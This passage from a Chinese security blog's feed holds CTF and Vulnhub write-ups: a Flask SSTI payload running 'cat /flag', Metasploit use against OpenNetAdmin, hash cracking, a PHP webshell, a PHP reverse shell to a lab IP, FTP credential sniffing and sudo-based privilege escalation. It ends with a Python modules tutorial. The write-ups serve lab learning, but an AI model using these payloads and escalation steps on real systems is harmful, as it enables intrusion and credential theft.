<h1 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h1><p>打开题目发现是一个谷歌搜索框，随便输入，跳转后查看源码提示ssti<br>简单测试存在ssti模板注入漏洞<br><img src="/2020/03/22/flask-ssti/9.png" alt><br>使用脚本判断os模块在第几位</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line">url=<span class="string">"http://b9ee3227-b857-464e-8f7f-6d5ecee85261.node3.buuoj.cn/qaq?name="</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">200</span>):</span><br><span class="line">    payload=<span class="string">"&#123;&#123;' '.__class__.__mro__[1].__subclasses__()["</span>+str(a)+<span class="string">"]&#125;&#125;"</span></span><br><span class="line">    r=req.get(url+payload)</span><br><span class="line">    r.encoding=<span class="string">"utf-8"</span></span><br><span class="line">    print(a)</span><br><span class="line">    print(r.text)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/22/flask-ssti/10.png" alt><br>发现在第117位，构造payload读取flag</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;&#123;''.<span class="strong">__class__</span>.<span class="strong">__mro__</span>[<span class="string">1</span>].<span class="strong">__subclasses__</span>()[<span class="string">117</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">'popen'</span>](<span class="link">'cat /flag'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/22/flask-ssti/11.png" alt></p>
<p>参考链接：<a href="https://www.lizenghai.com/archives/5702.html" target="_blank" rel="noopener">https://www.lizenghai.com/archives/5702.html</a></p>
<p>​        <a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">https://xz.aliyun.com/t/3679</a></p>
]]></content>
      <tags>
        <tag>SSTI模板注入</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机five86-1</title>
    <url>/2020/03/13/five86-1/</url>
    <content><![CDATA[<p><strong>vulnhub靶机five86-1</strong><br><strong>工具、知识点和漏洞:</strong></p>
<blockquote>
<p>1.<strong>sploitdb的使用</strong><br>2.<strong>crunch</strong>字典生成和<strong>john爆破</strong>的混搭<br>4.OpenNetAdmin命令注<br>5.利用kali进行SSH和靶机连接<br>6.<strong>sudo -l</strong>查看用户被授予其它权限的文件</p>
</blockquote>
<a id="more"></a>

<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>打开靶机后，先获取靶机的ip地址</p>
<figure class="highlight nsis"><table><tr><td class="code"><pre><span class="line">nmap -sP <span class="number">192.168</span>.<span class="number">211.1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/13/five86-1/1.png" alt><br>得到靶机的ip地址为192.168.211.143<br>然后使用nmap扫描靶机开放的端口</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -A <span class="number">192.168</span><span class="number">.211</span><span class="number">.143</span> -p <span class="number">1</span><span class="number">-65535</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/13/five86-1/2.png" alt><br>靶机开放了22、80、1000端口，并且在80端口下还发现了/ona目录。10000 是MiniSer一个从控制台或远程管理的系统<br>访问80端口，发现什么都没有 ，于是开始扫描网站目录</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">dirb http:<span class="comment">//192.168.211.143</span></span><br><span class="line">nikto -h <span class="number">192.168</span><span class="number">.211</span><span class="number">.143</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/13/five86-1/3.png" alt><br>访问robots.txt发现禁止爬虫访问/ona目录，那我们就手动访问吧哈哈<br>进去之后随便点了几下，发现了系统和版本,是一个OpenNetAdmin v18.1.1系统<br><img src="/2020/03/13/five86-1/4.png" alt><br><img src="/2020/03/13/five86-1/5.png" alt><br>还发现了一个弱口令，admin    admin直接登录成功，但是找不到怎么利用<br>在访问一下reports目录，结果发现要密码。<img src="/2020/03/13/five86-1/12.png" alt></p>
<h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h1><p>然后去kali漏洞库里面查看是否有相关漏洞</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">searchsploit opennetadmin</span></span><br></pre></td></tr></table></figure>

<p>发现了三个相关漏洞，.rb文件可以添加到msf中，先进入msf中查看是否有该漏洞<br><img src="/2020/03/13/five86-1/6.png" alt><br>发现msf中没有，就只能手动添加了，先复制到root</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cp <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/php/</span>webapps<span class="regexp">/47772.rb /</span>root</span><br></pre></td></tr></table></figure>

<p>然后查找一下msf的exploit文件夹在哪里</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="builtin-name">find</span> / -name exploit</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/13/five86-1/7.png" alt><br>其中最后一个目录为Kali中msf攻击载荷的文件夹 </p>
<p>但是正确的路径为/usr/share/metasploit-framework/modules/exploits，多了个s<br>将脚本复制进去</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">cp <span class="string">/root/47772.rb</span> <span class="string">./</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/13/five86-1/8.png" alt><br>在msf中使用这个模块</p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> exploit/<span class="number">47772</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/13/five86-1/9.png" alt><br>然后option设置好相关配置<br><img src="/2020/03/13/five86-1/10.png" alt><br>run获得会话，shell获得shell<br><img src="/2020/03/13/five86-1/11.png" alt><br>然后使用python进入交互模式</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">python -<span class="built_in">c</span> '<span class="keyword">import</span> pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>

<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>查找sudo权限命令，需要密码。<br>sudo -l<br><img src="/2020/03/13/five86-1/13.png" alt><br>SUID权限可执行文件，发现有exim4，查看具体版本后发现是4.92。存在本地提权漏洞(local root exploit)的版 本为exim &lt;= 4.84-3</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="builtin-name">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/13/five86-1/14.png" alt><br>常见的SUID提权可执行文件<br> nmap<br> vim<br> less<br> more<br> nano<br> cp<br> mv<br> find<br> wget<br> bash<br>/var/log/ona.log为OpenNetAdmin的日志文件，查看之后发现无可利用内容。<br> /var/mail/www-data为www-data用户的邮件，查看之后也无可利用内容。<br>然后想到还有个reports目录，然后发现该目录下有一个.htaccess文件<br><img src="/2020/03/13/five86-1/15.png" alt><br>该文件又将我们引向/var/www/.htpasswd文件<br>访问该文件<br><img src="/2020/03/13/five86-1/16.png" alt><br>这个应该是douglas的密码hash值，下面应该是提示，<br>＃为了减轻痛苦（标准词典可能会失败），<br>＃为此10个字符的密码使用以下字符集：aefhrt<br>意思是用这6个字母组成10个字母的密码。我们可以使用crunch生成爆破字典</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">crunch <span class="number">10</span> <span class="number">10</span> aefhrt &gt; dic.txt</span><br></pre></td></tr></table></figure>

<p>然后再去爆破hash</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">john </span>--wordlist=<span class="keyword">dic.txt </span>hash.txt</span><br></pre></td></tr></table></figure>

<p>得出密码为fatherrrrr<img src="/2020/03/13/five86-1/17.png" alt><br>使用ssh登录</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">ssh <span class="symbol">douglas@</span><span class="number">192.168</span><span class="number">.211</span><span class="number">.143</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/13/five86-1/18.png" alt><br>使用sudo -l命令查看当前用户有哪些root权限，看到cp(复制命令被赋予root)<br><img src="/2020/03/13/five86-1/19.png" alt><br>这应该是要让我们登录到jen这个账户里面去，具体方法：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">ssh-keygen -b <span class="number">2048</span></span><br><span class="line"><span class="comment"># 生成 2048 比特字节的密钥</span></span><br><span class="line"></span><br><span class="line">cp <span class="regexp">/home/</span>douglas<span class="regexp">/.ssh/i</span>d_rsa.pub <span class="regexp">/tmp/</span>authorized_keys</span><br><span class="line"><span class="comment"># 把生成的公钥复制到 /tmp/ 目录下并命名为：authorized_keys</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/13/five86-1/20.png" alt></p>
<p>这个时候我们来到 /tmp（临时目录）下给 authorized_keys 这个文件一个可执行权限，然后使用 sudo以 jen 用户权限去执行 cp 命令，把我们刚刚生成的 authorized_keys移动到 /home/jen/.ssh/ 目录下，这样我们才能登陆它</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">chmod <span class="number">777</span> authorized_keys</span><br><span class="line">sudo -u jen /bin/cp authorized_keys /home/jen/.ssh/</span><br><span class="line">ssh <span class="symbol">jen@</span><span class="number">192.168</span><span class="number">.211</span><span class="number">.143</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/13/five86-1/21.png" alt><br>这个跟前段时间将博客部署到云服务器上面差不多，先创建一个git用户，再添加本地公钥，这样上传博客文件的时候便不需要输入密码<br>进入jen账户里面后，在var/mail里面发现几封邮件，打开jen后发现moss的密码为Fire!Fire!<br><img src="/2020/03/13/five86-1/22.png" alt><br>su moss<br>再次使用sudo -l命令查看当前用户有哪些root权限，但是什么都没有<br>查看一下SUID权限可执行文件</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="builtin-name">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/13/five86-1/23.png" alt><br>发现了一个upyourgame具有suid权限<br>然后cd到那个目录下面去执行upyourgame</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="string">./upyourgame</span></span><br></pre></td></tr></table></figure>

<p>跟着指令回答最后便是root权限</p>
<p><img src="/2020/03/13/five86-1/24.png" alt><br>总结：这个靶机到这里就算日穿了，我也学到了很多，比如使用crunch去生成字典，在msf中添加漏洞利用脚本，使用cp命令将密钥copy到另一个账户从而达到免密登录等….</p>
<p>参考连接：<a href="https://www.cnblogs.com/sparkdev/p/9651622.html（[Linux" target="_blank" rel="noopener">https://www.cnblogs.com/sparkdev/p/9651622.html（[Linux</a> 特殊权限 SUID,SGID,SBIT]）</p>
<p>参考连接：<a href="http://www.liuwx.cn/Vulnhub-five86-1.html" target="_blank" rel="noopener">http://www.liuwx.cn/Vulnhub-five86-1.html</a></p>
]]></content>
      <tags>
        <tag>靶机渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机five86-2</title>
    <url>/2020/03/15/five86-2/</url>
    <content><![CDATA[<p><strong>vulnhub靶机five86-2</strong></p>
<p><strong>知识点：</strong></p>
<blockquote>
<p>1.wpscan的使用<br>2.tcpdump的抓包以及流量分析<br>3.wordpress插件提权</p>
</blockquote>
<a id="more"></a>

<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>主机发现：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -sP <span class="number">192.168</span><span class="number">.211</span><span class="number">.1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/15/five86-2/1.png" alt><br>目标主机的ip地址为192.168.211.144<br>扫描主机开放端口</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -A <span class="number">192.168</span><span class="number">.211</span><span class="number">.144</span> -p <span class="number">1</span><span class="number">-65535</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/15/five86-2/2.png" alt><br>目标主机开放了80,21端口，先访问一下80端口，是一个wordpress框架，但是显示混乱，我们解析一下DNS。路径C:\Windows\System32\drivers\etc<br><img src="/2020/03/15/five86-2/3.png" alt><br>查看浏览器指纹信息</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">whatweb <span class="string">http:</span><span class="comment">//192.168.211.144/</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/15/five86-2/4.png" alt><br>框架版本为wordpress 5.1.4<br>前面做过wordpress，可以使用wpscan进行扫描</p>
<h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h1><p>先爆破用户名</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">wpscan --url <span class="string">http:</span><span class="comment">//192.168.211.144 -e u</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/15/five86-2/5.png" alt><br>然后在使用wpscan爆破密码，可以使用自带的字典文件。</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">wpscan --url <span class="string">"http://192.168.211.144"</span> -U user.txt -P <span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>rockyou.txt</span><br></pre></td></tr></table></figure>

<p>爆破出两个用户的密码</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="string">[SUCCESS]</span> - barney / spooky1</span><br><span class="line"><span class="string">[SUCCESS]</span> - stephen / apollo1</span><br></pre></td></tr></table></figure>

<p>然后我们登陆，发现barney用户可以加载插件，然后可以去搜索插件的漏洞，利用插件提权。</p>
<p><img src="/2020/03/15/five86-2/6.png" alt><br>最后在searchsploit中发现Insert or Embed Articulate Content into WordPress Trial插件有一个漏洞<br><img src="/2020/03/15/five86-2/7.png" alt><br>详情</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> <span class="keyword">Create</span> a .zip archive <span class="keyword">with</span> <span class="number">2</span> files: <span class="keyword">index</span>.html, <span class="keyword">index</span>.php</span><br><span class="line"></span><br><span class="line">echo "&lt;html&gt;hello&lt;/html&gt;" &gt; <span class="keyword">index</span>.html</span><br><span class="line">echo "&lt;?php echo system($_GET['cmd']); ?&gt;" &gt; <span class="keyword">index</span>.php</span><br><span class="line">zip poc.zip <span class="keyword">index</span>.html <span class="keyword">index</span>.php </span><br><span class="line"></span><br><span class="line">## <span class="number">2.</span> <span class="keyword">Log</span> <span class="keyword">in</span> <span class="keyword">to</span> wp-<span class="keyword">admin</span> <span class="keyword">with</span> <span class="keyword">any</span> <span class="keyword">user</span> <span class="keyword">role</span> that has <span class="keyword">access</span> <span class="keyword">to</span> the plugin functionality (<span class="keyword">by</span> <span class="keyword">default</span> even `Contributors` <span class="keyword">role</span> have <span class="keyword">access</span> <span class="keyword">to</span> it)</span><br><span class="line">## <span class="number">3.</span> <span class="keyword">Create</span> a <span class="built_in">new</span> Post -&gt; <span class="keyword">Select</span> `<span class="keyword">Add</span> block` -&gt; E-Learning -&gt; Upload the poc.zip -&gt; <span class="keyword">Insert</span> <span class="keyword">as</span>: Iframe -&gt; <span class="keyword">Insert</span> (just <span class="keyword">like</span> <span class="keyword">in</span> tutorial https://youtu.be/knst26fEGCw?t=<span class="number">44</span> ;)</span><br><span class="line">## <span class="number">4.</span> <span class="keyword">Access</span> the webshell <span class="keyword">from</span> the URL displayed <span class="keyword">after</span> upload <span class="keyword">similar</span> <span class="keyword">to</span> </span><br><span class="line"></span><br><span class="line">http://website.com/wp-<span class="keyword">admin</span>/uploads/articulate_uploads/poc/<span class="keyword">index</span>.php?cmd=whoami</span><br></pre></td></tr></table></figure>

<p>点击insert获取路径</p>
<p><img src="/2020/03/15/five86-2/8.png" alt></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>five86-<span class="number">2</span><span class="regexp">/wp-content/u</span>ploads<span class="regexp">/articulate_uploads/</span>poc<span class="regexp">/index.php?cmd=whoami</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/15/five86-2/9.png" alt><br>成功执行，然后上传一句话木马用蚁剑连接，并构造PHP一句话反弹shell</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">xxx<span class="php"><span class="meta">&lt;?php</span> $sock=fsockopen(<span class="string">"192.168.211.135"</span>,<span class="number">1234</span>);exec(<span class="string">"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span>);<span class="meta">?&gt;</span></span>aaa</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/15/five86-2/10.png" alt><br>然后运行php shell2.php并在kali上监听<br><img src="/2020/03/15/five86-2/11.png" alt><br>然后使用python进入交互模式</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">python3 -<span class="built_in">c</span> '<span class="keyword">import</span> pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/15/five86-2/12.png" alt></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>发现barney用户权限比较低，所以先切换到Stephen用户<br><img src="/2020/03/15/five86-2/13.png" alt><br>查看一下系统进程：</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ps -auxwww</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/15/five86-2/14.png" alt></p>
<p>发现系统运行ftp，由于ftp传输是明文传输，这是时候想到监听系统网卡，分析流量，看看能不能捕捉到ftp的账号密码。<br>启动ftp的是“paul”帐号，使用“stephen”帐号通过tcpdump获取流量，并下载至本地分析。</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">tcpdump</span> -D</span><br><span class="line">注释：-D 打印出系统中所有可以用tcpdump截包的网络接口。</span><br></pre></td></tr></table></figure>

<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">timeout <span class="number">120</span> tcpdump -w hack<span class="selector-class">.pcap</span> -<span class="selector-tag">i</span> veth68d2569</span><br><span class="line">注释：</span><br><span class="line">timeout <span class="number">120</span>，是用来控制 tcpdump 的超时时间为 <span class="number">120s</span></span><br><span class="line">tcpdump -w 保存为 saul.pcap，-<span class="selector-tag">i</span> 的意思是指定监听的网络接口</span><br></pre></td></tr></table></figure>

<p> 最后读取刚刚获取的数据包发现一个 <code>FTP</code> 账号密码：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">tcpdump</span> <span class="selector-tag">-r</span> <span class="selector-tag">hack</span><span class="selector-class">.pcap</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/15/five86-2/15.png" alt></p>
<p>PASS esomepasswford</p>
<p>切换到paul用户<br><img src="/2020/03/15/five86-2/16.png" alt></p>
<p>sudo -l发现Paul可以以Peter的身份去运行<code>/usr/sbin/service</code><br><img src="/2020/03/15/five86-2/17.png" alt><br>接着我使用 <code>sudo</code> 来以 <code>peter</code> 用户去运行 <code>/usr/sbin/service</code> ，并切换到 <code>/bin/bash</code> ，这个时候就成功切换到 <code>peter</code> 用户：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sudo -u peter /usr/sbin<span class="built_in">/service </span><span class="built_in">..</span>/<span class="built_in">..</span>/bin/bash</span><br></pre></td></tr></table></figure>

<p>然后再一次sudo -l发现可以以root身份去运行usr/bin/passwd<br><img src="/2020/03/15/five86-2/18.png" alt><br>然后可以尝试修改root用户的密码</p>
<figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">sudo -u<span class="built_in"> root</span> passwd<span class="built_in"> root</span></span><br></pre></td></tr></table></figure>

<p>成功获得root权限<br><img src="/2020/03/15/five86-2/19.png" alt></p>
<p><img src="/2020/03/15/five86-2/20.png" alt></p>
]]></content>
      <tags>
        <tag>靶机渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>了解python常用模块和Scrapy框架</title>
    <url>/2020/04/22/python-Common-modules&amp;scrapy/</url>
    <content><![CDATA[<p>本文记录了一些python常用模块和Scrapy框架的简单利用，最后还写了一个爬取糗事百科图片的小例子。学习爬虫的目的主要是想锻炼一下自己的编程能力，因为真的很菜，后面还会不断加强练习。<a id="more"></a></p>
<h1 id="python常用模块"><a href="#python常用模块" class="headerlink" title="python常用模块"></a>python常用模块</h1><h2 id="random"><a href="#random" class="headerlink" title="random"></a>random</h2><p>此模块提供了随机数获取相关方法：</p>
<ul>
<li>random.random():获取[0.0,1.0)范围的浮点数</li>
<li>random.randint(a,b):获取[a,b]范围内的一个整数</li>
<li>random.uniform(a,b):获取[a,b]范围内的一个浮点数</li>
<li>random.shuffle(x):把参数指定的数据中的元素打乱混洗，参数必须是一个可变的数据类型</li>
<li>ramdom.sample(x,k):从x中随机抽取k个数据，组成一个列表返回。<br><img src="/2020/04/22/python-Common-modules&scrapy/1586935637208.png" alt="1586935637208"><h2 id="time"><a href="#time" class="headerlink" title="time"></a>time</h2>#获取时间戳#时间戳：从时间元年（1970.1.1 00:00:00）到现在经过的秒数</li>
</ul>
<blockquote>
<p>print(time.time())</p>
</blockquote>
<p>#获取格式化时间对象</p>
<blockquote>
<p>print(time.gmtime())<br>print(time.localtime())<br>print(time.gmtime(1))    #时间元年过一秒后，对应的时间对象</p>
</blockquote>
<p>格式化时间对象和字符串之间的转换</p>
<blockquote>
<p>s = time.strftime(“year:%Y %m %d %H:%M:%S”)<br>print(s)</p>
</blockquote>
<p>吧时间字符串转换成时间对象</p>
<blockquote>
<p>time_obj = time.strptime(“2020 10 10”,”%Y %m %d”)<br>print(time_obj)</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> timeprint(time.time())</span><br><span class="line">print(time.gmtime())</span><br><span class="line">print(time.localtime())</span><br><span class="line">print(time.gmtime(<span class="number">1</span>))    </span><br><span class="line">s= time.strftime(<span class="string">"year:%Y %m %d %H:%M:%S"</span>)print(s)</span><br><span class="line">time_obj = time.strptime(<span class="string">"2020 10 10"</span>,<span class="string">"%Y %m %d"</span>)</span><br><span class="line">print(time_obj)</span><br></pre></td></tr></table></figure>
<p><img src="/2020/04/22/python-Common-modules&scrapy/1586935683083.png" alt="1586935683083"><br>#暂停当前程序，睡眠xxx秒</p>
<blockquote>
<p>time.sleep(3)</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    print(time.strftime(<span class="string">'%Y %m %d %H:%M:%S'</span>))</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<p>datatime</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="comment">#date 类</span></span><br><span class="line">d = datetime.date(<span class="number">2020</span>,<span class="number">10</span>,<span class="number">10</span>)</span><br><span class="line">print(d)</span><br><span class="line"><span class="comment">#time类</span></span><br><span class="line">b = datetime.time(<span class="number">10</span>,<span class="number">42</span>,<span class="number">32</span>)</span><br><span class="line">print(b)</span><br><span class="line"><span class="comment">#time 类的属性</span></span><br><span class="line">print(b.hour)</span><br><span class="line">print(b.minute)</span><br><span class="line">print(b.second)</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">2020</span><span class="number">-10</span><span class="number">-10</span></span><br><span class="line"><span class="number">10</span>:<span class="number">42</span>:<span class="number">32</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">42</span></span><br><span class="line"><span class="number">32</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">c = datetime.datetime(<span class="number">2020</span>,<span class="number">11</span>,<span class="number">11</span>,<span class="number">11</span>,<span class="number">11</span>,<span class="number">11</span>)</span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/22/python-Common-modules&scrapy/1586938317494.png" alt="1586938317494"></p>
<p>时间运算，只能和date,datetime,timedelta进行运算</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">c = datetime.datetime(<span class="number">2020</span>,<span class="number">11</span>,<span class="number">11</span>,<span class="number">11</span>,<span class="number">11</span>,<span class="number">11</span>)</span><br><span class="line">b = datetime.timedelta(seconds=<span class="number">6</span>)</span><br><span class="line">print(b+c)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/22/python-Common-modules&scrapy/1586940858265.png" alt="1586940858265"></p>
<p>练习：计算某一年的二月份有多少天<br>方法：首先创建出指定的年份的3月1日，然后往前走一天</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">year = int(input(<span class="string">"输入年份:"</span>))</span><br><span class="line">d = datetime.date(year,<span class="number">3</span>,<span class="number">1</span>)</span><br><span class="line">td = datetime.timedelta(days=<span class="number">1</span>)</span><br><span class="line">print(d-td)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/22/python-Common-modules&scrapy/1586941302815.png" alt="1586941302815"></p>
<h2 id="OS"><a href="#OS" class="headerlink" title="OS"></a>OS</h2><p>OS： 和操作系统相关的操作</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment">#删除文件</span></span><br><span class="line">os.remove(<span class="string">"a.txt"</span>)</span><br><span class="line"><span class="comment">#从命名</span></span><br><span class="line">os.rename(<span class="string">'a.txt'</span>,<span class="string">'b.txt'</span>)</span><br><span class="line"><span class="comment">#删除目录</span></span><br><span class="line">os.removedirs(<span class="string">'aa'</span>)</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>os.mkdir</th>
<th align="left">创建目录</th>
</tr>
</thead>
<tbody><tr>
<td>os.rmdir</td>
<td align="left">删除目录</td>
</tr>
<tr>
<td>os.rename</td>
<td align="left">重命名</td>
</tr>
<tr>
<td>os.remove</td>
<td align="left">删除文件</td>
</tr>
<tr>
<td>os.getcwd</td>
<td align="left">获取当前工作路径</td>
</tr>
<tr>
<td>os.walk</td>
<td align="left">遍历目录</td>
</tr>
<tr>
<td>os.path.join</td>
<td align="left">连接目录与文件名</td>
</tr>
<tr>
<td>os.path.split</td>
<td align="left">分割文件名与目录</td>
</tr>
<tr>
<td>os.path.abspath</td>
<td align="left">获取绝对路径</td>
</tr>
<tr>
<td>os.path.dirname</td>
<td align="left">获取路径</td>
</tr>
<tr>
<td>os.path.basename</td>
<td align="left">获取文件名或文件夹名</td>
</tr>
<tr>
<td>os.path.splitext</td>
<td align="left">分离文件名与扩展名</td>
</tr>
<tr>
<td>os.path.isfile</td>
<td align="left">判断给出的路径是否是一个文件</td>
</tr>
<tr>
<td>os.path.isdir</td>
<td align="left">判断给出的路径是否是一个目录</td>
</tr>
</tbody></table>
<h2 id="sys"><a href="#sys" class="headerlink" title="sys"></a>sys</h2><p>和python解释器相关的模块</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">print(<span class="string">"The list of command line arguments:\n"</span>, sys.argv)</span><br><span class="line">print(<span class="string">"第一个参数名："</span>,sys.argv[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>

<blockquote>
<p>C:\Users\华硕\PycharmProjects\python\python安全应用编程&gt;python sys.py a1 a2 a3<br>The list of command line arguments:<br> [‘sys.py’, ‘a1’, ‘a2’, ‘a3’]<br>第一个参数名： a1</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">模块方法    解释说明</span><br><span class="line">sys.argv    传递到Python脚本的命令行参数列表，第一个元素是程序本身路径</span><br><span class="line">sys.executable  返回Python解释器在当前系统中的绝对路径</span><br><span class="line">sys.<span class="built_in">exit</span>([arg]) 程序中间的退出，arg=<span class="number">0</span>为正常退出</span><br><span class="line">sys.path    返回模块的搜索路径，初始化时使用PYTHONPATH环境变量的值</span><br><span class="line">sys.platform    返回操作系统平台名称，Linux是linux2，Windows是win32</span><br><span class="line">sys.<span class="built_in">stdout</span>.write(str)   输出的时候把换行符\n去掉</span><br><span class="line">val = sys.<span class="built_in">stdin</span>.readline()[:<span class="number">-1</span>] 拿到的值去掉\n换行符</span><br><span class="line">sys.version 获取Python解释程序的版本信息</span><br></pre></td></tr></table></figure>

<h2 id="json"><a href="#json" class="headerlink" title="json"></a>json</h2><p>javascript对象标记语言，与序列化和反序列化相关<br>序列化</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line">a = json.dumps((<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">5</span>))   <span class="comment">#把指定的字符串转换为json格式字符串</span></span><br><span class="line">print(a)</span><br><span class="line">print(type(a))</span><br><span class="line">res = json.dumps(<span class="number">10.5</span>)</span><br><span class="line">print(res)</span><br><span class="line">print(type(res))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/22/python-Common-modules&scrapy/1587043014158.png" alt="1587043014158"></p>
<p>反序列化</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line">res = json.dumps([<span class="number">2</span>,<span class="number">5</span>,<span class="number">6</span>])</span><br><span class="line">lst = json.loads(res)</span><br><span class="line">print(type(lst))</span><br><span class="line">print(lst)</span><br></pre></td></tr></table></figure>

